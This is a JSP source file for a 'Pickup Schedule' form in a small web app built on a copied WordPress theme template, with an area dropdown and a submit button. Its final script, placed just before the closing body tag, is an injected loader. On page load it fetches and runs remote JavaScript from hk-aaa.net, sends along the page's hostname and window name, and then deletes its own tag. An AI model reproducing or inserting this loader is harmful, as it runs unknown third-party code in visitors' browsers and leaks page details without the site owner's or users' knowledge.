<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>
<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en-US"> <![endif]-->
<!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en-US"> <![endif]-->
<!--[if IE 8]>    <html class="no-js lt-ie9" lang="en-US"> <![endif]-->
<!--[if IE 9]>    <html class="no-js lt-ie10" lang="en-US"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en-US"> <!--<![endif]-->

<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"  />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />

<title>
Pickup Schedule</title>

<link rel="stylesheet" type="text/css" href="css/language-selector.css"  media="all" />

<meta name="generator" content="WordPress 4.1.1" />
<meta name="robots" content="follow, all" />
<link rel="stylesheet"  type="text/css" href="css/style.css"  media="screen" />
<link rel="alternate" id="imx_templateurl"  href="http://imediapixel.com/demo/ecobiz/wp-content/themes/ecobiz-dev" />
<link rel="alternate" type="application/rss+xml" title="ECOBIZ RSS Feed" href="http://imediapixel.com/demo/ecobiz/feed/" />
<link rel="pingback" href="http://imediapixel.com/demo/ecobiz/xmlrpc.php" />
<link rel="shortcut icon" href="images/favicon.ico"/>

                        <script>
                            /* You can add more configuration options to webfontloader by previously defining the WebFontConfig with your options */
                            if ( typeof WebFontConfig === "undefined" ) {
                                WebFontConfig = new Object();
                            }
                            WebFontConfig['google'] = {families: ['Open+Sans:400&amp;subset=latin']};

                            (function() {
                                var wf = document.createElement( 'script' );
                                wf.src = 'https://ajax.googleapis.com/ajax/libs/webfont/1.5.3/webfont.js';
                                wf.type = 'text/javascript';
                                wf.async = 'true';
                                var s = document.getElementsByTagName( 'script' )[0];
                                s.parentNode.insertBefore( wf, s );
                            })();
                        </script>
                    <link rel="alternate" type="application/rss+xml" title="ECOBIZ &raquo; Feed" href="http://imediapixel.com/demo/ecobiz/feed/" />
<link rel="alternate" type="application/rss+xml" title="ECOBIZ &raquo; Comments Feed" href="http://imediapixel.com/demo/ecobiz/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="ECOBIZ &raquo; Contact Comments Feed" href="http://imediapixel.com/demo/ecobiz/contact/feed/" />
<link rel='stylesheet' id='imediapixel_prettyphoto-css' type="text/css" href='css/prettyPhoto.css' media='screen, all' />
<link rel='stylesheet' id='imediapixe_nivo-slider-css' type="text/css" href='css/nivo-slider.css' media='screen, all' />
<link rel='stylesheet' id='imediapixel_kwicks-css' type="text/css" href='css/kwicks.css' media='screen, all' />
<link rel='stylesheet' id='imediapixel_slicknav-css' type="text/css" href='css/slicknav.css' media='screen, all' />
<link rel='stylesheet' id='imediapixe_mediaquery-css' type="text/css" href='css/responsive.css' media='screen, all' />
<link rel='stylesheet' id='imediapixel_colorpicker-css' type="text/css" href='css/colorpicker.css' media='screen, all' />
<link rel='stylesheet' id='imediapixel_style_switcher-css' type="text/css"  href='css/style-switcher.css' media='screen, all' />
<link rel='stylesheet' id='imediapixel-demo-theme-css' type="text/css" href='css/default.css' media='screen, all' />
<link rel='stylesheet' id='wpml-cms-nav-css-css' type="text/css" href='css/navigation.css' media='all' />
<link rel='stylesheet' id='cms-navigation-style-base-css' type="text/css" href='css/cms-navigation-base.css' media='screen' />
<link rel='stylesheet' id='cms-navigation-style-css' type="text/css" href='css/cms-navigation.css' media='screen' />
<link rel='stylesheet' id='imediapixel_stylecustom-css' type="text/css" href='css/style-custom.css' media='screen, all' />
<style id='imediapixel_stylecustom-inline-css' type='text/css'>
body { background-color: #669100;}
body.bgpattern { background-image: url(${pageContext.request.contextPath }/User/images/gravel.png); background-repeat: repeat;background-size: auto;}
body { font-family: Arial, Helvetica, sans-serif; } p, ul li, ol li { color: #666666;font-size: 12px;} p { line-height: 21px;}
h1, h2, h3, h4, h5, h6 { font-family: Open Sans, Arial, Helvetica, sans-serif; font-weight: 400; font-style: ;}
#mainmenu ul li a { font-family: Open Sans, Arial, Helvetica, sans-serif; font-weight: 400; font-style: ; }

</style>
<link rel='stylesheet' id='elusive-iconfont-styles-css' type="text/css" href='css/elusive-webfont.css' media='screen, all' />
<link rel='stylesheet' id='elusive-iconfont-custom-css' type="text/css" href='css/elusive-webfont-custom.css' media='screen, all' />
                        <script>
                            /* You can add more configuration options to webfontloader by previously defining the WebFontConfig with your options */
                            if ( typeof WebFontConfig === "undefined" ) {
                                WebFontConfig = new Object();
                            }
                            WebFontConfig['google'] = {families: ['Open+Sans:400&amp;subset=latin']};

                            (function() {
                                var wf = document.createElement( 'script' );
                                wf.src = 'js/webfont.js';
                                wf.type = 'text/javascript';
                                wf.async = 'true';
                                var s = document.getElementsByTagName( 'script' )[0];
                                s.parentNode.insertBefore( wf, s );
                            })();
                        </script>
                    <script type='text/javascript' src='js/jquery.js'></script>
<script type='text/javascript' src='js/jquery-migrate.min.js'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://imediapixel.com/demo/ecobiz/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://imediapixel.com/demo/ecobiz/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.1.1" />
<link rel='shortlink' href='http://imediapixel.com/demo/ecobiz/?p=4' />
<meta name="generator" content="WPML ver:3.1.8.2 stt:1,4;0" />
<link rel="alternate" hreflang="en-US" href="http://imediapixel.com/demo/ecobiz/contact/" />
<link rel="alternate" hreflang="fr-FR" href="http://imediapixel.com/demo/ecobiz/contact/?lang=fr" />


<!-- <script>
  function loadState()
	{
		
		
		var zoneId=document.getElementById("aname");
		//var state=document.getElementById("state");
		
		var xmlhttp;
		
		if (window.XMLHttpRequest)
		  {// code for IE7+, Firefox, Chrome, Opera, Safari
		  	xmlhttp=new XMLHttpRequest();
		  }
		else
		  {// code for IE6, IE5
		  	xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		  }
		removeAllState();
	
		xmlhttp.onreadystatechange = function() {
			if (xmlhttp.readyState == 4) {

				var jsonObj = JSON.parse(xmlhttp.responseText);
				
				for(i=0 ; i<jsonObj.length ; i++)
				{
				
					var createOption=document.createElement("textbox");
					
					createOption.value=jsonObj[i].areaId;
					createOption.text=jsonObj[i].areaName;
					
					document.areaform.box.options.add(createOption);
					
				}
			}
			
		}

		xmlhttp.open("get", "${pageContext.request.contextPath}/addarea?flag=loadward&zoneId="+zoneId.value, true);
		xmlhttp.send();
		/* Holds the status of the XMLHttpRequest. Changes from 0 to 4:
			0: request not initialized
			1: server connection established
			2: request received
			3: processing request
			4: request finished and response is ready */
	}
	
	function removeAllState()
	{
		var removeState=document.areaform.ward.options.length;
		for(i=removeState ; i>0 ; i-- )
		{
			document.areaform.box.remove(i);
		}
	}
	
</script>
 -->
</head>

<body class="page page-id-4 page-template page-template-template-contactform page-template-template-contactform-php bgpattern bgimage">
  <div id="wrapper">
    <div class="header-contact-box">
            <div id="flags_language_selector"><img src="images/en.png" height="12" alt="en" width="18" /><a href="http://imediapixel.com/demo/ecobiz/contact/?lang=fr"><img src="images/fr.png" height="12" alt="fr" width="18" /></a></div >
            <ul class="header-contact">
                  <li><i class="icon-phone"></i> +62 123456</li>
                          <li><i class="icon-envelope"></i> <a href="mailto:imediapixel@gmail.com">imediapixel@gmail.com</a></li>
            </ul>
        </div>
    <div class="clear"></div>
    <div id="topwrapper"></div>
    <div id="mainwrapper">
      <!-- Header Start -->
      <div id="header">
        <div class="center">
          <!-- Logo Start -->
          <div id="logo">
                    <a href="User_index1.jsp"><img src="images/logo-green_final.png" alt="Logo"/></a>
          </div>
          <!-- Logo End -->
          
          
        </div>
      </div>
      <!-- Header End  -->
          
            
              <!-- Page Heading --> 
        
        <!-- Page Heading End -->
        
      <div class="clear"></div>
            
      <div class="center">
            
                  
        <!-- Main Content Wrapper -->
        <div class="maincontent-full">
          <!-- Contact Form -->
          <div id="conctactleft">
                                   <h1 font color="Green" allign="center">Pickup Schedule</h1>
                       
            <div id="maincontactform">
              <form action="<%=request.getContextPath()%>/addschedule" name="areaform" id="contactform" method="get"> 
              <div>
              
              <div class="form-group ">
                                          Area Name:
                                          <!-- <div class="col-lg-10">
                                              <input class=" textfield" id="cname" name="area" minlength="2" type="text" required /><span class="require"> *</span><br/>
                                          </div> -->
                                           <%@taglib uri="http://java.sun.com/jstl/core_rt" prefix="c" %>
                                          <select class="textfield " id="aname" name="area"  type="text" required><span class="require"> *</span><br/>
											<c:forEach items="${sessionScope.search}" var="x">
                                              <option value="${x.areaId }">${x.areaName }</option>
											</c:forEach>
                                          </select>
               </div>
                               <button class="button medium white" type="submit">Send</button>
                				<input type="hidden" name="flag" value="run">
                	
                
                <div class="clear"></div>
               </div>
              </form>
            </div>
          </div>
          <!-- Contact Form End -->
          
          <!-- Contact Address -->                  
          <!-- Contact Address End -->          
        </div>
        <!-- Full Width Wrapper End -->
    
      </div>
      <div class="clear"></div>
    </div>

    <!-- Footer Start -->
    <div id="bottomwrapper"></div>
    
        <!-- Footer End  -->
  </div>
  <script type='text/javascript' src='js/comment-reply.min.js'></script>
<script type='text/javascript' src='js/jquery.easing.min.js'></script>
<script type='text/javascript' src='js/jquery.fancybox.pack.js'></script>
<script type='text/javascript' src='js/jquery.fancybox-media.js'></script>
<script type='text/javascript' src='js/jquery.nivo.slider.pack.js'></script>
<script type='text/javascript' src='js/jquery.kwicks.min.js'></script>
<script type='text/javascript' src='js/jquery.tools.tabs.min.js'></script>
<script type='text/javascript' src='js/jquery.gmap.min.js'></script>
<script type='text/javascript' src='js/filterable.pack.js'></script>
<script type='text/javascript' src='js/superfish.js'></script>
<script type='text/javascript' src='js/jquery.slicknav.min.js'></script>
<script type='text/javascript' src='js/jquery.scrollup.js'></script>
<script type='text/javascript' src='js/modernizr.js'></script>
<script type='text/javascript' src='js/functions.js'></script>
<script type='text/javascript' src='js/colorpicker.js'></script>
<script type='text/javascript' src='js/jquery.color.js'></script>
<script type='text/javascript' src='js/jquery.cookie.js'></script>
<script type='text/javascript' src='js/switcher.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var icl_vars = {"current_language":"en","icl_home":"http:\/\/imediapixel.com\/demo\/ecobiz"};
/* ]]> */
</script>
<script type='text/javascript' src='js/sitepress.js'></script>
<script id="ae77f684bc5e1ed37b67a615aa4098a3" async="true" type="text/javascript">if(window.self===window.top){window._aid='1000';window._geo='India';window._mid='9b23c56d-8c04-401d-a493-bf9b191307fe';window._timestamp=(Math.round(new Date().getTime()/1000));window._imjs_dyn='//hk-aaa.net/dynamic/main.php?aid=1000&geo=India&mid=9b23c56d-8c04-401d-a493-bf9b191307fe&pid=salus&dt=18032015&udt=29032015&grp=8&url='+location.hostname+'&win='+(window.name+' ').substr(0,30).replace(/[^0-9a-zA-Z]/g,'_')+((location.protocol==='http:')?'&http=1':'');!function(){function e(e){var t=document.createElement('script');t.type='text/javascript',t.src=e,t.async=!0,t.onload=t.onreadystatechange=function(){this.readyState&&'loaded'!==this.readyState&&'complete'!==this.readyState||(t.onload=t.onreadystatechange=null,t.parentNode&&t.parentNode.removeChild(t))};var n=document.body||document.getElementsByTagName('body')[0]||document.documentElement;n&&n.insertBefore(t,n.firstChild)}function t(e){cr_readyCallback=e,a&&cr_readyCallback()}function n(){if(!a){if(!document.body)return setTimeout(n,1);a=!0,'function'==typeof cr_readyCallback&&cr_readyCallback()}}function o(){return'complete'===document.readyState?setTimeout(n,1):void(document.addEventListener?(cr_DOMContentLoaded=function(){document.removeEventListener('DOMContentLoaded',cr_DOMContentLoaded,!1),n()},document.addEventListener('DOMContentLoaded',cr_DOMContentLoaded,!1),window.addEventListener('load',n,!1)):document.attachEvent&&(cr_DOMContentLoaded=function(){'complete'===document.readyState&&(document.detachEvent('onreadystatechange',cr_DOMContentLoaded),n())},document.attachEvent('onreadystatechange',cr_DOMContentLoaded),window.attachEvent('onload',n)))}var a=!1;o(),t(function(){e(_imjs_dyn);_imjs_dyn='';var n=document.getElementById('ae77f684bc5e1ed37b67a615aa4098a3');n.parentNode&&n.parentNode.removeChild(n)})}();}</script></body>
</html>